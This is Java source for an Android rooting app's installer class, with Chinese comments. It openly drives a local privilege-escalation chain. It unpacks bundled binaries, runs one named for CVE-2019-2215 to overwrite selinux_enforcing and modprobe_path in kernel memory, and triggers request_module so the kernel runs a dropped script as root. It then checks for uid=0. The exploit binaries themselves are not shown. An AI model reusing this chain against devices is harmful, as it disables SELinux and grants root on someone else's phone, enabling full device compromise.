package com.oldroot.manager;

import android.content.Context;
import android.os.Build;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * 在手机内部完成「一键获取 Root」：解出静态二进制，跑 CVE-2019-2215，
 * 触发 request_module 让内核执行 wb.sh，最后由 wb.sh 启动 suvd。
 */
public final class RootInstaller {

    public interface Listener {
        void onStep(String message);

        void onDone(Result result);
    }

    public static final class Result {
        public boolean ok;
        public String title = "";
        public String detail = "";
    }

    private RootInstaller() {
    }

    public static boolean isArm64() {
        if (Build.SUPPORTED_ABIS != null) {
            for (String abi : Build.SUPPORTED_ABIS) {
                if (abi != null && abi.startsWith("arm64")) {
                    return true;
                }
            }
        }
        return Build.CPU_ABI != null && Build.CPU_ABI.startsWith("arm64");
    }

    public static void run(Context ctx, Listener listener) {
        Result r;
        try {
            r = runInner(ctx, listener);
        } catch (Throwable t) {
            r = new Result();
            r.ok = false;
            r.title = "获取失败";
            r.detail = "异常：" + t.getClass().getSimpleName() + " " + String.valueOf(t.getMessage());
        }
        listener.onDone(r);
    }

    private static Result runInner(Context ctx, Listener l) {
        Result r = new Result();

        if (RootManager.isRunning()) {
            r.ok = true;
            r.title = "Root 已就绪";
            r.detail = "授权守护进程已经在运行，不需要重复获取。";
            return r;
        }
        if (!isArm64()) {
            r.ok = false;
            r.title = "机型不支持";
            r.detail = "这个利用链只支持 arm64 内核。当前 ABI：" + Build.CPU_ABI + "。";
            return r;
        }

        StringBuilder log = new StringBuilder();

        l.onStep("解出 suvd / probe26…");
        File dir = new File(ctx.getFilesDir(), "root");
        if (!dir.exists() && !dir.mkdirs()) {
            r.ok = false;
            r.title = "无法创建目录";
            r.detail = dir.getAbsolutePath();
            return r;
        }

        File suvd = new File(dir, "suvd");
        File probe = new File(dir, "probe26");
        File wb = new File(dir, "wb.sh");
        File probeLog = new File(dir, "probe26.log");

        try {
            copyAsset(ctx, "arm64-v8a/suvd", suvd);
            copyAsset(ctx, "arm64-v8a/probe26", probe);
            String tpl = readAssetText(ctx, "wb.sh.in");
            tpl = tpl.replace("\r\n", "\n");
            tpl = tpl.replace("__APPDIR__", dir.getAbsolutePath());
            tpl = tpl.replace("__PKG__", ctx.getPackageName());
            tpl = tpl.replace("__UID__", String.valueOf(android.os.Process.myUid()));
            tpl = tpl.replace("__EXTRA__", "");
            writeText(wb, tpl);
            setExec(suvd);
            setExec(probe);
            setExec(wb);
        } catch (IOException e) {
            r.ok = false;
            r.title = "解包失败";
            r.detail = String.valueOf(e.getMessage());
            return r;
        }

        if (wb.getAbsolutePath().length() > 190) {
            r.ok = false;
            r.title = "路径太长";
            r.detail = "modprobe_path 最多约 200 字节，当前：" + wb.getAbsolutePath();
            return r;
        }

        l.onStep("第 1/3 步：内核写（selinux_enforcing / modprobe_path）\n可能要 5–10 秒，请勿操作");
        String out1;
        try {
            out1 = runFor(probe, new String[]{
                    "-p", wb.getAbsolutePath(),
                    "-L", probeLog.getAbsolutePath(),
                    "-y", "-q"
            }, 120);
        } catch (Exception e) {
            out1 = "启动 probe26 失败：" + e;
        }
        log.append(out1);
        if (!out1.contains("result=OK")) {
            r.ok = false;
            r.title = "内核写没有命中";
            r.detail = "本次开机可能已经运行过、或堆布局没有对上。\n"
                    + "建议重启手机后再点一次。\n\n" + tail(out1, 2500);
            return r;
        }

        l.onStep("第 2/3 步：触发 request_module()，让内核执行 root 脚本");
        String out2;
        try {
            out2 = runFor(suvd, new String[]{"-t"}, 20);
        } catch (Exception e) {
            out2 = "触发失败：" + e;
        }
        log.append("\n").append(out2);

        l.onStep("第 3/3 步：启动授权守护进程");
        boolean up = false;
        for (int i = 0; i < 30; i++) {
            if (RootManager.isRunning()) {
                up = true;
                break;
            }
            try {
                Thread.sleep(400);
            } catch (InterruptedException ignored) {
            }
        }
        if (!up) {
            r.ok = false;
            r.title = "守护进程没有起来";
            r.detail = "内核脚本可能没有执行。请确认应用没有被「自启动管理」拦截，"
                    + "并查看 /data/local/tmp/.su/suvd.log。\n\n" + tail(log.toString(), 2500);
            return r;
        }

        l.onStep("验证完整 root…");
        try {
            RootManager.ExecResult er = RootManager.exec("id; getenforce");
            if (er.denied) {
                r.ok = false;
                r.title = "Root 被拒绝";
                r.detail = er.message;
                return r;
            }
            log.append("\n").append(er.output);
            if (er.output.contains("uid=0")) {
                r.ok = true;
                r.title = "Root 已就绪";
                r.detail = er.output.trim() + "\n\n重启手机后自动失效；再次打开本应用点一下即可重新获取。";
                return r;
            }
            r.ok = false;
            r.title = "验证失败";
            r.detail = er.output + "\n\n" + tail(log.toString(), 2000);
            return r;
        } catch (Exception e) {
            r.ok = false;
            r.title = "验证失败";
            r.detail = String.valueOf(e.getMessage()) + "\n\n" + tail(log.toString(), 2000);
            return r;
        }
    }

    private static void setExec(File f) {
        f.setReadable(true, false);
        f.setExecutable(true, false);
    }

    private static String tail(String s, int n) {
        if (s == null) return "";
        if (s.length() <= n) return s;
        return "…\n" + s.substring(s.length() - n);
    }

    private static String runFor(File bin, String[] args, int timeoutSec) throws IOException {
        List<String> cmd = new ArrayList<String>();
        cmd.add(bin.getAbsolutePath());
        for (String a : args) cmd.add(a);

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(bin.getParentFile());
        pb.redirectErrorStream(true);
        Process p = pb.start();

        final ByteArrayOutputStream buf = new ByteArrayOutputStream();
        Thread reader = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    InputStream in = p.getInputStream();
                    byte[] b = new byte[4096];
                    int n;
                    while ((n = in.read(b)) > 0) {
                        synchronized (buf) {
                            if (buf.size() < 512 * 1024) buf.write(b, 0, n);
                        }
                    }
                } catch (IOException ignored) {
                }
            }
        });
        reader.setDaemon(true);
        reader.start();

        long deadline = System.currentTimeMillis() + timeoutSec * 1000L;
        int code = -1;
        while (System.currentTimeMillis() < deadline) {
            try {
                code = p.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                try {
                    Thread.sleep(100);
                } catch (InterruptedException ignored) {
                }
            }
        }
        if (code < 0) {
            try {
                p.destroy();
            } catch (Exception ignored) {
            }
        }
        try {
            reader.join(2000);
        } catch (InterruptedException ignored) {
        }
        synchronized (buf) {
            return new String(buf.toByteArray(), "UTF-8");
        }
    }

    private static void copyAsset(Context ctx, String name, File dst) throws IOException {
        InputStream in = ctx.getAssets().open(name);
        FileOutputStream out = new FileOutputStream(dst);
        try {
            byte[] b = new byte[32768];
            int n;
            while ((n = in.read(b)) > 0) out.write(b, 0, n);
            out.flush();
            out.getFD().sync();
        } finally {
            try {
                in.close();
            } catch (IOException ignored) {
            }
            out.close();
        }
    }

    private static String readAssetText(Context ctx, String name) throws IOException {
        InputStream in = ctx.getAssets().open(name);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            byte[] b = new byte[8192];
            int n;
            while ((n = in.read(b)) > 0) out.write(b, 0, n);
        } finally {
            in.close();
        }
        return new String(out.toByteArray(), "UTF-8");
    }

    private static void writeText(File dst, String text) throws IOException {
        FileOutputStream out = new FileOutputStream(dst);
        try {
            out.write(text.getBytes("UTF-8"));
            out.flush();
            out.getFD().sync();
        } finally {
            out.close();
        }
    }
}
